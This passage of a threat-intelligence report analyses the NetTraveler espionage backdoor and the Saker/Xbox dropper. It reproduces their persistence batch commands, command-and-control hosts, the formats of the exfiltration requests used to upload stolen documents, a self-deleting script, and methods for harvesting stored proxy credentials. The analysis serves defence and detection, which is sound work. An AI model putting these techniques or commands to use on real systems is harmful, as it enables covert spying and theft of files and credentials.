scribed criterias are (eg.) “ias”,”iprip”, “irmon” 

and a few others. these names are different on 

other Windows os and even depend on installed 

features or service Packs. the malware takes 

the first matching service name and uses it.

right after that, the malware attempts to delete 

%WiNDir%\system32\<servicename>ex.

dll and registers a new system service with the 

same name <servicename>. the service is 

designed to be a Win32 shared process like 

svchost, autostarted by system service control 

manager during system boot. that creates cor-

responding system registry values in hklm\

SySTem\currentcontrolSet\Services\<ser-

vicename>.



28

The NeTTraveler

After that it saves to local directory and executes 

the following batch file (net.bat):

@echo off

@reg add “hkey_local_machiNe\SyS-

Tem\currentcontrolSet\Services\irmon\

parameters” /v ServiceDll /t reG_expaND_

SZ /d c:\WiNDoWS\system32\<servicen-

ame>ex.dll

 

note that <servicename> is replaced with the 

actual system service name that was previously 

found.

After that the module creates the c:\WiN-

DoWS\system32\<servicename>ex.dll file 

on disk and sets hard-coded file creation and 

last access date and time to “20:00 17 august 

2004”.

the new file is then filled with data produced 

after decryption of the hard-coded data block.

nettraveler bacKdoor 
(droPPed file)

mD5 3c0ea91ea42f2bf6686e 9735998e406e

create date 
(GmT) 2013.02.18 02:33:49

Size 204’800

linker version 6.0 (msVc++ 6.0)

descriPtion

the malware is Win32 Pe dll file compiled in mi-

crosoft Visual c++ 6.0. it has one export function 

servicemain which has the main functionality of 

the module.

 this module has initial filename assigned during 

compilation: “dll.dll”.

technicAl detAils

upon start the module sets corresponding ser-

vice status to “start_Pending” and then imme-

diately to “running”.

 it checks if system mutex named “NetTravler is 

running!” exists and terminates if that is true. 

note: other known mutexes used by variants of 

nettraveler include:

 > boat-12 is running!

 > dochunter2012 is running!

 > hunter-2012 is running!

 > nt-2012 is running!

 > nettravler is running!

 > nettravler2012 is running!

 > sh-2011 is running!

 > shenghai is running!

 

After that it opens %WiNDir%\system\con-

fig_t.dat file and parses the following values:



 29

APPendix A: mAlWAre technicAl AnAlysis

Option]

WebPage

DownCmdTime

UploadRate

[OtherTwo]

AutoCheck

CheckedSuccess

it creates a list of local paths in memory to work 

with later:

 > %sysdir%\stat_t.ini

 > %sysdir%\dnlist.ini

 > %sysdir%\enumfs.ini

 > %sysdir%\uenumfs.ini

 > %sysdir%\udidx.ini

 >  %temP%\ntvba00.tmp\

 

if checkedSuccess value from ini file equals 0 or 

doesn’t exist, the module will fetch additional con-

figuration from the same ini file [other] section:

 > pS (string with no default value, max 64 

chars)

 > pp (integer with default value: 80)

 > pu (string with no default value, max 32 

chars)

 > pW (string with no default value, max 32 

chars)

 > pf (integer with default value: 10)

 

next the module prepares some strings for test-

ing the internet connection:

<modulename>.log

http://www.microsoft.com/info/privacy_se-

curity.htm (%testurl%)

ironically, the %testurl% is a microsoft web 

page about privacy, security and safety online 

(last updated in January 2000):



30

The NeTTraveler

After that with the help of Wininet APi the mod-

ule issues an httP Get request to %testurl% 

(see above) and the following hardcoded httP 

header values:

accept: image/gif, image/x-xbitmap, image/

jpeg, image/pjpeg, application/x-shock-

wave-flash, */*

accept-language: en-us

proxy-connection: keep-alive

pragma: no-cache

user-agent: mozilla/4.0 (compatible; mSie 

6.0)

 

it sets other options such as proxy server ad-

dress and port (Ps and PP values from ini file 

or attempts to find proxy settings automatical-

ly), proxy username and password (Pu and PW 

values from the ini file), several connection 

timeouts limited with 60 seconds.

the module submits the request and reads the 

response of the server. the response is stored 

in newly allocated memory block.

After that the malware appends debug output 

to the log file named <modulename>.log. the 

output messages are shown below:

method currect:

User: <current user name>

ProxyIP::

ProxyBypass::

User: <proxy username>

Pass: <proxy password>

<data from the URL>

///////////////////////////////////////////////

 if the Ps, PP, Pu, PW parameters were not found 

the ini file or Autocheck value is set to 1, the 

module attempts to find local proxy settings ac-

cording to the procedure below.

finding Proxy 
configuration

 First, the module lists contents of %ProGrAm-

Files% directory and appends the listing to the 

log file.

 then it opens ie history file of the current user 

(history.ie5\index.dat) parses it and appends 

the log with discovered logins/password saved 

in the the history file as a part of visited urls.

 After that the module logs current version of 

internet explorer. interestingly that the log file is 

appended with the following hard coded string:

“ie版本: internet explorer “, 版本 means “ver-

sion” in simplified chinese.



 31

APPendix A: mAlWAre technicAl AnAlysis

the module reads ie version from hKlm\soft-

ware\microsoft\internet explorer\Version reg-

istry value.

then it gets version of current os, and again 

appends the result to the log file with some hard 

coded strings in it:

“操作系统版本” which means “version of oper-

ating system” in simplified chinese.

the malware is capable of interpretation of sys-

tem minor/major code and recognizing the fol-

lowing o ses:

 > microsoft Windows 95

 > microsoft Windows 95 osr

 > microsoft Windows 98

 > microsoft Windows 98 se

 > microsoft Windows millennium edition

 > microsoft Windows nt

 > microsoft Windows 2000

 > microsoft Windows xP

 > microsoft Windows 2003

 > microsoft Windows Vista

 > microsoft Windows 7

 

it can also recognize type of os: Professional, 

server, Advanced server and exact version and 

build numbers are also appended to the log file.

there were four different methods to find proxy 

configuration on the system according to the log 

file messages set in three functions. one of the 

function (method 2) was probably merged with 

another one (method 3) in newer variant of the 

malware.

method 1:

this is a straightforward attempt to connect to 

the test url, assuming that system-wide proxy 

settings are correct or no proxy is required to 

access the external website. the url for testing 

is http://www.microsoft.com/info/privacy_

security.htm with the following header values:

accept: image/gif, image/x-xbitmap, image/

jpeg, image/pjpeg, application/x-shock-

wave-flash, */*

accept-language: en-us

proxy-connection: keep-alive

pragma: no-cache

 

if the method succeeds the module appends 

received data from the url to the log file and 

corresponding parameter is set in the ini file 

(uP=0).

if something fails the following message is ap-

pended to the log file: “method1 fail!!!!!”

method 2 And method 3:

this method is used when the infected machine 

uses proxy server but the settings are not avail-

able for local system user. A user working at 



32

The NeTTraveler

the infected machine might have internet ac-

cess and should have the required proxy server 

settings.

the malware list all processes running on the 

machine and locates process named “exPlor-

er.exe”. this process is a system shell which is 

normally running after local user successfully 

authenticates and logs in to the system. the 

malware finds explorer process and obtains se-

curity token which is later used to temporarily 

impersonate as local user and get proxy con-

figuration with internetQueryoptionA(0,inter-

net_oPtion_Proxy,...) APi call.

if the result contains proxy settings the malware 

gets them. if for some reason local proxy set-

tings were not found in current user profile, the 

malware attempts to double-check and opens 

ie settings in the registry. the following registry 

values are checked:

hkcu\Software\microsoft\Windows\cur-

rentversion\internet Settings\proxyenable

hkcu\Software\microsoft\Windows\cur-

rentversion\internet Settings\proxyServer

hkcu\Software\microsoft\Windows\cur-

rentversion\internet Settings\proxyover-

ride

After that the malware first obtains the ie stored 

credentials. it iterates through all stored local 

user secrets via credenumerateA and looks for 

those which start with “microsoft_Wininet_” and 

contain the address of the proxy server previ-

ously obtained. these secrets are decrypted 

with cryptunprotectdata APi call. such call is 

possible only after impersonation as local user 

which is available for the malware running with 

local system privileges. this method checks the 

first available password in the list of passwords 

from the system stored secrets.

once the potential server, port, login and pass-

word are obtained the malware makes a test 

query to the same url: http://www.microsoft.

com/info/privacy_security.htm. if it succeeds 

the content of this page is appended to the log 

file with all details about the proxy server. if the 

method fails it prints the following line in the log 

file: “method3 fail!!!!!”

method 4:

this method is identical to method 3 with just 

one difference: it checks the last available pass-

word in the list of passwords from the system 

stored secrets.

method x (debuG):

there is also an unused method in the code with 

no internal number, which was most likely used 

to debug the application as it writes all interme-

diate results to the log file, starting from string 



 33

APPendix A: mAlWAre technicAl AnAlysis

“Get from ieoption!” or “Get from reg!” de-

pending on the path of code execution.

if the malware failed to locate the proxy server it 

unregisters current malicious service by deleting 

corresponding registry keys in hklm\System\

currentcontrolSet\<servicename>\ and at-

tempts to delete all related files from the fol-

lowing list:

 > c:\Windows\system32\enumfs.ini

 > c:\Windows\system32\uenumfs.ini

 > c:\Windows\system32\udidx.ini

 > c:\Windows\system32\dnlist.ini

 > c:\Windows\system32\stat_t.ini

otherwise, if the proxy was checked successful-

ly the malware writes the following value to the 

config file (config_t.dat):

[OtherTwo]

CheckedSuccess=1

 

After that the module sleeps for 60 seconds and 

starts a new thread (see below thread1), sleeps 

10 more seconds and creates another thread 

(see below thread2). right after that it enters an 

infinite loop of doing nothing but sleeping which 

can be interrupted by a special value in global 

variable set by other threads. upon detecting 

this value the service routine ends which termi-

nates the service execution.

threAd1 (commAnd And control 
threAd)

this thread starts from collecting local system 

information, including the following:

 > local computer name

 > local iP address

 > local user name

 > os version, build and product type

 > list of local disk drives with available 

space on them

 > cPu characteristics including vendor 

identifier and frequency

 > rAm status

 > current process lists

 > output of the “ipconfig /all” system 

command

 

this information is stored in a text buffer with 

chinese comments like shown below (transla-

tion is added in red):

[计算机信息] computer information

计算机: <local hostname> computer

用户名: <local username> user name

ip地址: <local iP> Address

操作系统: <os> <service Pack> (<build num-

ber>) operating system 

 

磁盘空间: 总磁盘空间为:***Gb,剩余磁盘空间

为***Gb(占**.**%)

disk space: total disk space ***Gb, the remain-

ing disk space ***Gb (**.**%)

cPu: <cPu type> <cPu Frequency>mhZ

物理内存: 总物理内存:***mb,可用内存:***mb (

占**.**%)



34

The NeTTraveler

Physical memory: total physical memory: ***mb 

of available memory: ***mb (**.**%)

[进程列表] Process list

0 [system Process]

4 system

892 smss.exe

948 csrss.exe

972 winlogon.exe

1016 services.exe

1028 lsass.exe

…

c&c communicAtion

this information is saved in %WiNDir%\Sys 

tem32\system_t.dll text file. this file is read 

a moment later, compressed using a custom 

lempel-Ziv-based algorithm, encoded with a 

modified base64 encoding and uploaded to the 

c&c server using httP Get request of the fol-

lowing format:

GET /nt12/newyork/city/nettraveler.asp?host 

id=<DriveCSerialNumber>&hostname=<Host 

name>&hostip=<Host IP>&filename=travlerback 

info-<Current date and time>.dll&filestart=0&file 

text=begin::<modified Base64 and LZ-compressed  

data>::end

Accept: image/gif, image/x-xbitmap, image/jpeg, 

image/pjpeg, application/x-shockwave-flash, */*

Accept-Language: en-us

Pragma: no-cache

User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win 

dows NT 5.0)

Host: vip222idc.s169.288idc.com

Connection: Keep-Alive

 

if the file upload is successful, the module de-

letes the “system_t.dll” file. Please note that 

the serial number of current disk drive (most 

likely it is drive “c”) is used in httP query value 

hostid. this identifier derived from the local 

filesystem is used later as a reliable identifier of 

current infected machine or simply botid.

the control looP

After that it enters control loop. every 10 minutes 

according to the downcmdtime parameter val-

ue in the config file, it sends httP Get request 

of the following format:

GET /nt12/new york /cit y/nettraveler.asp?ac 

tion=getcmd&hostid=<DriveCSerialNumber>&host 

name=<Hostname>

…

if the server response starts with “[cmdbegin]” 

and ends with “[cmdend]” then the response 

is saved in c:\Windows\System32\stat_t.

ini file. After that the code confirms receiving 

the command by submitting another httP Get 

request in the format below:

GET /nt12/newyork/city/nettraveler.asp?action= 

gotcmd&hostid=<DriveCSerialNumber>&hostname 

=<Hostname>

…



 35

APPendix A: mAlWAre technicAl AnAlysis

the module expects server to reply “success”. if 

it doesn’t the module will try again in 10 minutes.

if the server was notified and confirmed receiv-

ing the notification, the module reads stat_t.

ini file which is just another config in ini format:

[Download]

dircount=<integer, default 0>

filecount=<integer, default 0>

f1=<string>

f2=<string>

f3=<string>

…

d1=<string>

d2=<string>

d3=<string>

…

[Scan]

dircount=<integer, default 0>

filecount=<integer, default 0>

All values f<number> from stat_t.ini file are read and 

saved in %WINDIR%\System32\dnlist.ini file:

[Filelist]

f1=<string>

f2=<string>

f3=<string>

…

All values d<number> from stat_t.ini file are read 

and the corresponding local directory and sub-

directories listings are collected and appended 

to the dnlist.ini file in the format:

[Filelist]

f1=<string>

f2=<string>

f3=<string>

…

the following values from stat_t.ini file are also 

transferred to the dnlist.ini file:

section 
in stat_t.ini

 value 
in stat_t.ini  default

 section 
 in dnlist.ini

 value 
 in dnlist.ini

 [scan]  dircount [scanlist]  dircount

 [scan]  scanAll False  [scanlist]  scanAll

 [other]  typelimit true  [other]  typelimit

 [other]  usearch true  [other]  usearch

 [other]  Gsearch true  [other]  Gsearch

 [other]  utypelimit true  [other]  utypelimit

 [other]  uAuto False  [other]  uAuto

 [other]  types doc, docx, xls, xlsx, txt, rtf, pdf  [other]  types



36

The NeTTraveler

 [other]  uP False  [other]  0 or 1

 [other]  Ps [other]  Ps

 [other]  PP 80  [other]  PP

 [other]  Pu  [other]  Pu

 [other]  PW  [other]  PW

 [other]  PF  10  [other]  PF

this is clearly the functionality which lets the 

attacker download specific files or even full di-

rectories including all subdirectories contents 

basing on defined file search criterias, such as 

file extensions.

Filesystem scAn

the malware has a file enumeration routine, 

which gets the settings from dnlist.ini (such as 

directory paths to process) and launches a re-

cursive directory search. the output is saved to 

enumfs.ini file in the following format:

[Computer]

Name=<Local system name>

Page=<Current Windows ANSI code page (ACP)>

[<Local system name>]

d1=<string>

d2=<string>

…

d<N>=<string>

dircount=<N>

[<d1 string>]

f1=<string>

f2=<string>

…

f<M>=<string>

d1=<string>

d2=<string>

…

d<K>=<string>

dircount=<K>

filecount=<M>

[<d2 string>]

…

After execution, this log file contains directories 

with all filenames and subdirectories. only di-

rectory/file names are stored, with no addition-

al data such as timestamps or size. When the 

search is finished, the module saves current 

date to the dnlist.ini file and changes option 

scanAll, see format below. this is done to avoid 

recurrent scanning of the filesystem, which is 

normally a heavy process and might be noticed 

by local user or an administrator.

[EnumTime]

DateTime=<YYYY-MM-DD date>

[ScanList]

ScanAll=False



 37

APPendix A: mAlWAre technicAl AnAlysis

After scanning the local filesystem, enumfs.

ini file is uploaded to the server via httP Get 

request described above (see the submission 

process of stat_t.ini file in the beginning of c&c 

communication part) with filename of the fol-

lowing format:

filelist-<month><Day>-<hour><minute> 

<Second>.ini

uPloAdinG Files

the next stage of this thread uploads files inter-

esting for the attacker to the c&c server. this 

process is described below.

the module works with files described in dnlist.

ini file. it gets a list of file extensions that must 

be uploaded to the c&c first. there is a default 

list of extensions (value Types of section [oth-

er]) that represent interest for the attackers: 

doc,docx,xls,xlsx,txt,rtf,pdf. then it gets file-

total values from [filelist] section of dnlist.ini 

and iterates through every f<N> value, where n 

is a positive integer starting from 1.

there are several tests applied to each file, be-

fore it is uploaded to the server, including the 

following:

 > File size must not be larger than ~10mb 

(10’485’760 bytes).

 > File must have one of the extensions from 

the “types” option.

if the file matches the criterias, then a unique 

file state identifier for that file is created, 

which is an md5 hash of the following string: 

“<filename> <year>-<month>-<Day> 

<hour>:<minute>:<Second>:<millisec-

onds>”. the date and time values in the string 

before are obtained from the file last change 

time.

After that the module creates a name used for 

uploading the file to the server, which consists 

of the following: “<year>-<month>-<Day>-

<hour>-<minute>-<file state identifier, the 

mD5>”. the time and date values are also taken 

from the file’s last change time. this file is up-

loaded to the c&c using the same procedure as 

used before for uploading other files.

After that, thread1 attempts to upload a file called 

uenumfs.ini, which is created by the thread2. the 

remote filename is set to the following “ufilel-

ist-<month><Day>-<hour><minute><Sec-

ond>.ini”.

next, the thread iterates through %Temp%\

ntvba00.tmp\ directory and uploads every file 

located there. the file names are preserved as 

they are.

control Procedure

then, the thread issues a special httP Get re-

quest to get next control instruction from the 

c&c. this is done by accessing the following uri:



38

The NeTTraveler

hXXp://vip222idc.s169.288idc.com/nt12/newyork/

city/nettraveler.asp?action=getdata (3)

server response is converted to uppercase and 

analyzed. there is defined set of responses ex-

pected from the c&c server:

01. <botid>:uninstAll

this command simply uninstalls the malicious 

service from the registry and deletes locally cre-

ated files.

02. <botid>:uPdAte

this procedure starts from uninstalling current 

service, then it issues three httP Get requests 

to the c&c script url:

GET .../newyork/city/nettraveler.asp?action=data-

size to get the size of updated module that will 

be pushed with next request.

GET .../newyork/city/../updata.exe to get the up-

dated module to be executed. this module is 

instantly saved to %Windir%\install.exe and 

executed.

03. <botid>:reset

this procedure simply removes all temporary 

files, such as the following:

 > %sysdir%\enumfs.ini

 > %sysdir%\dnlist.ini

 > %sysdir%\udidx.ini

 > %sysdir%\uenumfs.ini

 > %sysdir%\stat_t.ini

04. <botid>:uPloAd

this procedure is identical to the uPdAte com-

mand described before with one difference - no 

uninstallation of the current module is done, only 

new executable is downloaded and started. this 

method is probably used to execute additional 

independent malicious executable, unrelated 

to the original nettraveler malware. or it can 

be used to infect with the nettraveler backdoor 

configured for some other c&c server.

After processing any of the commands above 

the malware issues the following request to the 

server to confirm command execution:

GET .../newyork/city/nettraveler.asp?action=updat-

ed&hostid=<BotId>

if the server hasn’t issued the uninstAll com-

mand the thread continues execution starting 

from the beginning of the control loop (see 

above).



 39

APPendix A: mAlWAre technicAl AnAlysis

threAd2 (driVe monitorinG threAd)

this thread creates a hidden window with class 

name “NTmainWndclass” and processes win-

dow messages in a loop until it is interrupted by 

special variable value. the window procedure 

processes only one window message, Wm_De-

vicechaNGe with wParam value set to DbT_

Devicearrival, which is sent by the system 

when a new removable device such as usb flash 

drive or network shared folder is attached to 

the system.

the module will proceed only if the attached 

removable device has provided a disk volume. 

it is designed to have different procedures for 

removable disk drives from usb flash and net-

work shares.

the usb drives will be processed only if GSearch 

value is set to true in [other] section of dnlist.

ini file. similarly, a new network drive will be 

processed only if uSearch value is set to true 

in [other] section of dnlist.ini file.

both network and removable usb drives are 

processed in the same procedure, which reads 

the following values from dnlist.ini file:

[Other]

UTypeLimit=<boolean, default True>

UAuto=<boolean, default False>

 

if uAuto option is set to true, the thread creates 

%Temp%\ntvba00.tmp\ directory and opens 

uenumfs.ini file for writing. the latter is filled 

with directories and subdirectories listings of the 

attached disk drive. the format of the data in 

uenumfs.ini is almost identical to the one created 

during fixed drive filesystem scan (see “Filesys-

tem scan” part in thread1 description above).

in addition to that, the same criterias are applied 

to each file (size and file extension) as in fixed 

drive filesystem scan. Also, every file gets a state 

id calculated as md5 hash of the filename and 

timestamp of the last modification. this hash 

is used to generate a new filepath in the follow-

ing format: %Temp%\ntvba00.tmp\<year>-

<month>-<Day>-<hour>-<minute>-<file 

state id, mD5 hexadecimal string>.<original 

extension>. the source file from newly attached 

drive is then copied to the destination set by the 

generated file path. Please note, that the file orig-

inal extension is preserved, while the file name is 

changed. that is used to prevent further problems 

when working with unsupported encoding.

At the same time when file is copied to ntvba00.

tmp directory, a record is added to udxidx.ini 

file, which has the following format:

[Index]

<File state id, MD5 hexadecimal string>=1

this is done to avoid copying files that were al-

ready copied before, unless they were changed 

by the user.



40

The NeTTraveler

to avoid excessive use of the disk drive and oc-

casional interest of the local user, the file copy-

ing procedure has a delay. every 1000 files the 

thread delays execution and sleeps for 9 sec-

onds.

side notes

useless text transformation

in function which gets disk volume serial num-

ber the actual serial number is converted from a 

decimal integer to a hexadecimal number stored 

as an Ascii string. the integer is converted to 

a string with call to the “sprintf’ function and 

“%8x” parameter which outputs 8 characters 

representing a number in hexadecimal form. 

despite the fact that the output of this call is in 

uppercase, the author of the module converts 

the output to uppercase characters again. this 

could be due to the fact that the author used to 

have “%8x” format string before, which made 

such conversion rational. however, that clearly 

shows that the developer wasn’t aware of vari-

ous format strings options, which shows lack of 

experience in c/c++ development.



 41

APPendix A: mAlWAre technicAl AnAlysis

Drive monitoring disk processing issue

As we mentioned above the drive monitoring 

thread uses the same function to process 

removable usb drives and network shares 

attached as local drives. Visible separation of 

these two types of disk drives (in the name of 

the options Gsearch and usearch, where “u” 

probably stands for “usb” and “G” is for “Glob-

al”, and in separate logical branches of code 

flow) is later misused, as the drive processing 

routines is bound to usb drives. At least it read 

u-prefixed options from dnlist.ini file, which 

logically corresponds to the usb-type of disk 

drive, but used for both. While this is a minor 

issue and probably didn’t cause a serious 

problem for the attackers, this shows that the 

developer felt lazy at some point and used 

copy and Paste approach to avoid creating 

extra code. it could also mean that one part of 

the code was created by one person and later 

modified by another, who mistakenly over-

looked general code design.

Data decompression routine

the malware uses a custom data compres-

sion algorithm when uploading files to the 

c&c server. While the decompression is not 

required for the work of the application, the 

code for the decompression routine was also 

found in the malicious module. this clearly 

indicates a design flaw and shows that the de-

veloper didn’t review the code on a binary level 

after it was compiled, which is common among 

beginners among malware authors and quite 

widespread among common software develop-

ers. ‘saker’ (‘xbox’) dropper and loader

‘saKer’ (‘xbox’) droPPer 
and loader

mD5 c239af6aff1226fa2 b2bb77dfec865ce

create date (GmT) 2013.03.13 12:39:21

Size 67’072

vulnerability 
Targeted 6.0 (msVc++ 6.0)

descriPtion

the module is non-packed Win32 Pe executable 

file compiled in microsoft Visual c++ 6.0. Al-

though no encryption or compression is used to 

protect or hide parts of the code, simple obfus-

cation is applied to internal strings. the module 

main purpose is to install and embedded dll file 

or load it during system startup.

technicAl detAils

execution of the main function starts with ob-

taining local user startup directory. this path is 

appended with “\service.lnk”.



42

The NeTTraveler

the strings, which are used in the application are 

stored in simple obfuscated form. For example, 

the “Kaspersky lab” is stored as “K.sp4r6ky 

aa,”. the 1, 4, 6, 10 and 12 characters are re-

placed with hardcoded character constants as 

shown below:

then the module gets local %temP% folder path 

and constructs paths “%Temp%\service.dll” 

and “%Temp%\service.exe”.

After that the code checks if the current module 

file name is called “service.exe”.

if current module is not called “service.exe”, 

the module copies itself to “%tmP%\service.

exe” and creates corresponding lnK file in lo-

cal user’s startup folder pointing to the freshly 

created executable. the executable file is as-

signed an attribute “hidden” and started in a 

new process. then the module checks if Kasper-

sky products are installed on local system by 

iterating through %ProGrAmFiles% directory 

and looking for “kaspersky lab” subdirectory. if 

it finds Kaspersky products it quickly exits, if not 

it attempts to self-delete by running “cmd.exe /c 

del <moduleName>” and then exits.

if the module was already installed in the system 

and is called “service.exe”, it checks if system mu-

tex object called “SecuT!” already exists and exits 

if it’s true. this is done to avoid multiple instances 

of the module from running simultaneously.

After that, the module creates a new file at 

“%Temp%\service.dll” and saves a part of own 

data to the new file. the data offset is hardcoded 

as a string “46592”.

next, it attempts to load the “%temP%\service.

dll” library file and call export function named 

“JustTempfun”. After that the module enters 

an infinite sleep loop.



 43

APPendix A: mAlWAre technicAl AnAlysis

‘saKer’ (‘xbox’) bacKdoor 
(droPPed file)

mD5 6312bc2b156062 ba5358e7099a88bb95

create date (GmT)  2013.03.13 12:35:11

Size  46’592

vulnerability 
Targeted  6.0 (msVc++ 6.0)

descriPtion

the module is a non-packed Win32 dll exe-

cutable file compiled in microsoft Visual c++ 

6.0. Although no encryption or compression is 

used to protect or hide parts of the code, simple 

obfuscation is applied to internal strings. the 

module is to clearly a backdoor application that 

enables an attacker to manage files, get infor-

mation about local disk drives, download and 

start new executables. this backdoor is probably 

authored by the same developer who created the 

Gh0st / Zegost rAt.

technicAl detAils

this module has 2 export functions: JustTemp-

fun and servicemain. module main function as 

well as servicemain are empty procedures. so 

far, all functionality of the module is located in 

JusttempFun function.

meanwhile, there is another known malicious 

dll which has exactly these export names - 

Gh0st rAt, that was also developed by chinese.

When this module is loaded with xbox loader 

described above execution is started with Just-

tempFun exported function. this function begins 

with deobfuscation of the strings used further:

pitgay.minidns.net

8090BBBBBBBBBBBB

GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG

SakerEvent

FFFFFFFFFFFFFFFF

Proxy

HHHHHHHHHHHHHHHH

obviously pitgay.minidns.net is the c&c server 

domain name. 8090 is the port the malware con-

nects to. As for the “GGG...”, “FFF...” and “hhh...” 

strings, according to the further code analysis 

they are used as a placeholders for the hardcode 

proxy settings:

the “FFF...” placeholder may contain “Proxy” 

string instead of “F” sequence which works as a 

flag to use the proxy settings from the “GGG...” 

placeholder in the form that wininet accepts 

(according to msdn, the format is “http=http://

http_proxy other”). the “hhh...” placeholder is 

for proxy username and password.

the thread collects information about the local 

system, such as

 > os version

 > cPu type



44

The NeTTraveler

 > used and available memory

 > local system name

 > used and available disk space of the 

drive c:\

the last value is converted to a hexstring of 8 

characters and xor-ed with current computer 

name. the purpose of this value is unclear.

then the information collected before is encrypt-

ed using simple string obfuscation algorithm, 

shown below in a pseudo code:

void ObfuscateString(char* strIn, char* strOut, int 

nLen)

{

char c;

for (i=0;i <nLen; i++)

{

c = strIn[i] % 32;

if(c <= 9)

strOut[2*i] = c+0x30;

else

strOut[2*i] = c+0x37;

if(strIn[i] <= 9)

strOut[2*i+1] = strIn[i]+0x30;

else

strOut[2*i+1] = strIn[i]+0x37;

}

}

this algorithm not only adds obfuscation but 

also adds some redundancy, which doubles the 

size of the input string.

the module attempts to connect to a c&c server 

and issue using the following url:

http://pitgay.minidns.net:8090/3010...

Also, it uses a hardcoded user-Agent string. 

there is not query string parameters, the data 

is transferred in a form of cGi path consisting of 

hex numbers only and prefixed with 3010, which 

makes such requests rather unique. 3010 most 

likely defines client request id. here is how a 

request may look:

GET /301000000000F0FD...0000000000000000000

000000 HTTP/1.1

User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win-

dows NT 5.0; .NET CLR 1.1.4322)

Host: tsgoogoo.net

Host: pitgay.minidns.net:8090

Cache-Control: no-cache

the module checks the server response code 

and if that is httP 200, it reads 2 dWord values 

(lets call them ParamA and Paramb) from the the 

server response.

the first dWord (ParamA) defines the command 

and following execution path. below is the inte-

ger values and commands description:



 45

APPendix A: mAlWAre technicAl AnAlysis

1020: Shutdown

1021: Shutdown

both 1020 and 1021 commands are used to 

interrupt execution of the module and terminate 

the main thread. the module also sets local 

thread privileges to enable global system shut-

down, however this is not used later and proba-

bly represents some remains of the code written 

earlier or another variant of the code. this is also 

confirmed by by the shutdown procedure exe-

cuted afterwards, which is designed to disable 

Windows hook mechanism while it wasn’t used 

previously anywhere in the code.

1022: Self-remove

this command is used to self-remove current 

module and stop its execution. it attempts to 

create a local batch file named del.bat with the 

following contents and run it:

@echo off

ping /n 5 127.0.0.1 >nul

>nul del /f/s/q/a <CurrentModuleDir>\service.exe

>nul del /f/s/q/a <CurrentModuleDir>\service.dll

>nul del %0 /s/q/a/f del.bat

Please note non-standard way to call Windows 

command line interpreter which starts from re-

direction of output to nul virtual device. Also, 

the command arguments are not separated with 

space or tab characters, and it might look invalid, 

however cmd.exe on Windows xP, Windows 7 and 

Windows 8 executed it correctly without a problem.

1029: file manager

the command spawns a new thread which 

opens a new session with the server to provide 

file management operations.

the new thread makes 2 httP Get requests 

to the server, which are identical to the 3010 

request described above. the only difference 

is the request id, which is 4001 and 4002 for 

the first and second requests correspondingly. 

the output of the 4001 request is ignored, while 

request 4002 is interpreted.

the server response contains 2 dWord values: 

lets call them filecmdid and DataSize. if data-

size is non-zero the module fetches additional 

data which length is specified in the datasize 

option.

the Filecmdid defines which operation must be 

executed. it can be one of the following values:

5001: Get drive information. Provides informa-

tion about specified disk drive: free space, drive 

type. client command success code is 0, error 

code is 7004.

5002: Get file information. Provides information 

about specified file: file times, attributes. client 

command success code is 0, error code is 7003.

5003: Get directory information. Provides 

information about specified directory: directory 



46

The NeTTraveler

times, attributes, full size. client command suc-

cess code is 0, error code is 7003.

5004: Get directory listing. Provide simple di-

rectory listing, which includes file names, sizes, 

last write time. client command success code is 

0, error code is 7001.

5006: create directory. create a new directory, 

which full path is provided by the server. client 

command success code is 0, error code is 7016.

5008: list drives. list available disk drives with 

information about free space. client command 

success code is 0, error code is not defined.

5009: run application. run local application 

with path and command line arguments passed 

from the server. client command success code 

is 0, error code is 7005.

5017: Get recursive directory listing. Provide 

recursive directory listing. client command suc-

cess code is 0, error code is 7000.

5025: run pushed executable. this command 

is used to save file pushed by the server and run 

instantly. When this command is received the 

module checks if it can create a new file, which 

name is passed by the server response. if it 

fails it submits error code 7003. then it spawns 

a new thread which issues a new httP Post 

request with command id 3005 and system in-

formation attached in the cGi Path. the request 

of the server should contain file data to write to 

the already opened file and execute right away.

5026: upload file to the server. the command 

is used to read local file and transfer it to the 

server. it gets file information, including time-

stamps and size and spawns a new thread. if any 

of those operations fails the module reports er-

ror code 7003 to the server. otherwise it reports 

success code 0 and spawns a new thread. the 

new thread reads the file specified in the request 

and uploads it to the server.

1039: Download and run new module.

the module uses Paramb as an integer value 

indicating a length of a string to read next from 

the server response. the received string will be 

used as a newFilename. then it reads another 

dWord value from the server response and 

interprets it as a size of the following data to 

read. After that a new directory “internet ex-

plorer” is created in the directory of the current 

running module. then the module creates a new 

file using the value newFilename pushed by the 

server. the module makes 2 attempts to start a 

new process: by calling createProcessA system 

APi and shellexecuteA if the previous call failed.

the code was designed to support more com-

mands (1028, 1029, 1032, 1033, 1034, 1035, 

1036), however they are now falling into com-

mand 1029 handler and then ignored. We cre-

ated a chart showing a tree of commands de-

pendencies:



 47

APPendix A: mAlWAre technicAl AnAlysis

the execution of this command processing thread continues in a loop until it is interrupt-

ed by shutdown command coming from the server. the code starts new loop iteration 

after hardcoded value of 30 seconds.




